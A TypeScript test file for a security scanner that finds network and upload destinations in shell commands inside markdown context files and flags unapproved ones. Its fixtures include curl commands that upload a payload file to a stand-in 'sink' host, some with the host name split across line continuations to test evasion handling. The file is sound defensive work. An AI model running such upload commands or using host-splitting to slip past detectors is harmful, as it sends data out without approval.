import assert from "node:assert/strict";
import test from "node:test";

import {
  associatedNetworkDestinations,
  associatedUploadDestinations,
  classifyDestinationCandidates,
  securityDiagnosticFindings,
} from "../src/security-diagnostics.js";
import {
  analyzeDestinations,
  analyzeDestinationsFromProjection,
  analyzeLogicalShellCommands,
  logicalShellCommands,
  networkDestinations,
  unapprovedDestinations,
  uploadDestinations,
} from "../src/security-destination/index.js";
import {
  projectShellContinuations,
  projectionSpanToSourceSpan,
} from "../src/security-destination/logical-shell.js";
import type { Artifact } from "../src/types.js";
import { SECURITY_DESTINATION_CASES } from "./fixtures/security-destination-cases.js";

const destinationProjection = (
  destinations: Array<{ host: string; path: string }>,
) => destinations.map(({ host, path }) => ({ host, path }));

test("shared destination fixtures preserve lexical classification", () => {
  for (const fixture of SECURITY_DESTINATION_CASES) {
    if (fixture.expectedCandidates === undefined) continue;
    const actual = classifyDestinationCandidates(fixture.input).map(
      (candidate) => ({
        kind: candidate.kind,
        ...(candidate.destination === undefined
          ? {}
          : {
              host: candidate.destination.host,
              path: candidate.destination.path,
            }),
      }),
    );
    assert.deepEqual(actual, fixture.expectedCandidates, fixture.name);
  }
});

test("shared destination fixtures preserve network association", () => {
  for (const fixture of SECURITY_DESTINATION_CASES) {
    assert.deepEqual(
      destinationProjection(associatedNetworkDestinations(fixture.input)),
      fixture.expectedNetwork,
      fixture.name,
    );
  }
});

test("shared destination fixtures preserve upload association", () => {
  for (const fixture of SECURITY_DESTINATION_CASES) {
    assert.deepEqual(
      destinationProjection(associatedUploadDestinations(fixture.input)),
      fixture.expectedUpload,
      fixture.name,
    );
  }
});

test("shared destination fixtures preserve exact allowlist matching", () => {
  for (const fixture of SECURITY_DESTINATION_CASES) {
    const analysis = analyzeDestinations(fixture.input);
    for (const destinations of [
      networkDestinations(analysis),
      uploadDestinations(analysis),
    ]) {
      assert.deepEqual(
        unapprovedDestinations(
          destinations,
          destinations.map(({ raw }) => raw),
        ),
        [],
        fixture.name,
      );
    }
  }
});

test("destination IR separates explicit intent from normalization", () => {
  const input = "Upload to http://[invalid-ipv6]/data.";
  const analysis = analyzeDestinations(input);

  assert.deepEqual(
    analysis.operationalDestinations.map(
      ({ intent, actionKind, destination, candidateSpan, evaluation }) => ({
        intent,
        actionKind,
        destination,
        candidateSpan,
        evaluation,
      }),
    ),
    [
      {
        intent: "network",
        actionKind: "explicit-transport",
        destination: undefined,
        candidateSpan: {
          startOffset: 10,
          endOffset: input.length,
          startLine: 1,
          endLine: 1,
        },
        evaluation: {
          kind: "not-evaluated",
          reason: "unsupported-host",
        },
      },
      {
        intent: "upload",
        actionKind: "prepositional-action",
        destination: undefined,
        candidateSpan: {
          startOffset: 10,
          endOffset: input.length,
          startLine: 1,
          endLine: 1,
        },
        evaluation: {
          kind: "not-evaluated",
          reason: "unsupported-host",
        },
      },
    ],
  );
});

test("retained newlines honor a non-default absolute source line base", () => {
  const input = "curl https://one.example.com\ncurl https://two.example.com";
  const projection = projectShellContinuations(input, 20);
  const newlineOffset = input.indexOf("\n");

  assert.equal(projection.projection, input);
  assert.deepEqual(
    projection.sourceOffsetByProjectionOffset,
    Array.from({ length: input.length }, (_, index) => index),
  );
  assert.ok(
    projection.sourceOffsetByProjectionOffset.every(
      (offset) => offset >= 0 && offset < input.length,
    ),
  );
  assert.ok(
    projection.sourceLineByProjectionOffset
      .slice(0, newlineOffset)
      .every((line) => line === 20),
  );
  assert.equal(projection.sourceLineByProjectionOffset[newlineOffset], 20);
  assert.ok(
    projection.sourceLineByProjectionOffset
      .slice(newlineOffset + 1)
      .every((line) => line === 21),
  );

  assert.deepEqual(
    projectionSpanToSourceSpan(
      { start: 0, end: newlineOffset + 1 },
      projection,
      input.length,
    ),
    {
      startOffset: 0,
      endOffset: newlineOffset + 1,
      startLine: 20,
      endLine: 20,
    },
  );
  assert.deepEqual(
    projectionSpanToSourceSpan(
      { start: newlineOffset + 1, end: input.length },
      projection,
      input.length,
    ),
    {
      startOffset: newlineOffset + 1,
      endOffset: input.length,
      startLine: 21,
      endLine: 21,
    },
  );
});

test("removed continuations retain offset gaps with an absolute line base", () => {
  const input = [
    "curl https://sink.example.com/upload \\",
    "  --data-binary @payload.json",
  ].join("\n");
  const projection = projectShellContinuations(input, 40);
  const backslashOffset = input.indexOf("\\");
  const secondLineOffset = backslashOffset + 2;
  const secondLineProjectionOffset =
    projection.sourceOffsetByProjectionOffset.indexOf(secondLineOffset);

  assert.ok(secondLineProjectionOffset > 0);
  assert.equal(projection.projection.includes("\n"), false);
  assert.equal(
    projection.sourceOffsetByProjectionOffset.includes(backslashOffset),
    false,
  );
  assert.equal(
    projection.sourceOffsetByProjectionOffset.includes(backslashOffset + 1),
    false,
  );
  assert.equal(
    (projection.sourceOffsetByProjectionOffset[secondLineProjectionOffset] ??
      0) -
      (projection.sourceOffsetByProjectionOffset[
        secondLineProjectionOffset - 1
      ] ?? 0),
    3,
  );
  assert.ok(
    projection.sourceLineByProjectionOffset
      .slice(0, secondLineProjectionOffset)
      .every((line) => line === 40),
  );
  assert.ok(
    projection.sourceLineByProjectionOffset
      .slice(secondLineProjectionOffset)
      .every((line) => line === 41),
  );
  assert.deepEqual(
    projectionSpanToSourceSpan(
      {
        start: secondLineProjectionOffset,
        end: projection.projection.length,
      },
      projection,
      input.length,
    ),
    {
      startOffset: secondLineOffset,
      endOffset: input.length,
      startLine: 41,
      endLine: 41,
    },
  );
});

test("document logical-command IR retains original multiline source mapping", () => {
  const sourceLines = [
    "Unrelated prose before the command.",
    "curl https://sink.exam\\",
    "ple.com/upload \\",
    "  --data-binary @payload.json",
    "Unrelated prose after the command.",
  ];
  const commands = logicalShellCommands(sourceLines, sourceLines, 0, {
    isLineEligible: () => true,
    sameBlock: () => true,
    isCodeContentLine: () => true,
  });
  assert.equal(commands.length, 1);

  let classifications = 0;
  const analyses = analyzeLogicalShellCommands(
    commands,
    (originalInput, shellProjection) => {
      classifications += 1;
      return analyzeDestinationsFromProjection(originalInput, shellProjection);
    },
  );
  assert.equal(classifications, 1);

  const command = commands[0];
  assert.ok(command);
  const analysis = analyses.get(command);
  assert.ok(analysis);
  assert.equal(analysis.input, sourceLines.slice(1, 4).join("\n"));
  assert.equal(analysis.sourceBaseLine, 2);
  assert.equal(networkDestinations(analysis)[0]?.host, "sink.example.com");
  assert.equal(uploadDestinations(analysis)[0]?.host, "sink.example.com");
  assert.deepEqual(
    analysis,
    analyzeDestinationsFromProjection(command.input, command.shellProjection),
  );

  const hostBoundary = analysis.projection.indexOf("ple.com");
  assert.ok(hostBoundary > 0);
  assert.equal(
    (analysis.sourceOffsetByProjectionOffset[hostBoundary] ?? 0) -
      (analysis.sourceOffsetByProjectionOffset[hostBoundary - 1] ?? 0),
    3,
  );

  const evaluated = analysis.operationalDestinations.filter(
    ({ evaluation }) => evaluation.kind === "evaluated",
  );
  assert.equal(evaluated.length, 2);
  for (const operational of evaluated) {
    const span = operational.candidateSpan;
    assert.ok(span.startOffset >= 0);
    assert.ok(span.endOffset <= analysis.input.length);
    assert.equal(span.startLine, 2);
    assert.equal(span.endLine, 3);
    assert.equal(
      analysis.input
        .slice(span.startOffset, span.endOffset)
        .replaceAll("\\\n", ""),
      operational.destination?.raw,
    );
    if (operational.commandSpan !== undefined) {
      assert.ok(operational.transferSpan);
      assert.ok(operational.commandSpan.startOffset <= span.startOffset);
      assert.ok(operational.commandSpan.endOffset >= span.endOffset);
      assert.ok(
        operational.commandSpan.startOffset <=
          operational.transferSpan.startOffset,
      );
      assert.ok(
        operational.commandSpan.endOffset >= operational.transferSpan.endOffset,
      );
      assert.ok(operational.transferSpan.startOffset <= span.startOffset);
      assert.ok(operational.transferSpan.endOffset >= span.endOffset);
      assert.equal(operational.commandSpan.startLine, 2);
      assert.equal(operational.commandSpan.endLine, 4);
      assert.equal(operational.transferSpan.startLine, 2);
      assert.equal(operational.transferSpan.endLine, 4);
      assert.equal(
        analysis.input.slice(
          operational.commandSpan.startOffset,
          operational.commandSpan.endOffset,
        ),
        analysis.input,
      );
    }
  }
});

test("public findings keep complete evidence for a host-split curl command", () => {
  const instruction = [
    "curl https://sink.exam\\",
    "ple.com/upload \\",
    "  --data-binary @payload.json",
  ].join("\n");
  const content = `---
allowed_data: public
network_allowed: true
approved_network_destinations: approved.example.com
external_upload_allowed: true
approved_upload_destinations: approved.example.com
---

Unrelated prose before the command.

\`\`\`bash
${instruction}
\`\`\`

Unrelated prose after the command.
`;
  const artifact: Artifact = {
    path: "contexts/security/continued-command.md",
    absolutePath: "/repo/contexts/security/continued-command.md",
    kind: "context",
    sizeBytes: Buffer.byteLength(content),
    contentClassification: "text",
    markdownParserEligible: true,
    content,
  };
  const commandStartLine =
    content.split("\n").indexOf(sourceFirstLine(instruction)) + 1;
  const findings = securityDiagnosticFindings([artifact]).filter(({ id }) =>
    [
      "SEC-UNAPPROVED-NETWORK-DESTINATION",
      "SEC-UNAPPROVED-UPLOAD-DESTINATION",
      "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
    ].includes(id),
  );
  assert.equal(findings.length, 3);
  for (const finding of findings) {
    assert.deepEqual(finding.evidence, {
      path: artifact.path,
      startLine: commandStartLine,
      endLine: commandStartLine + 2,
      snippet: instruction,
    });
    assert.doesNotMatch(finding.evidence.snippet, /Unrelated prose/u);
  }
});

function sourceFirstLine(value: string): string {
  return value.split("\n")[0] ?? "";
}
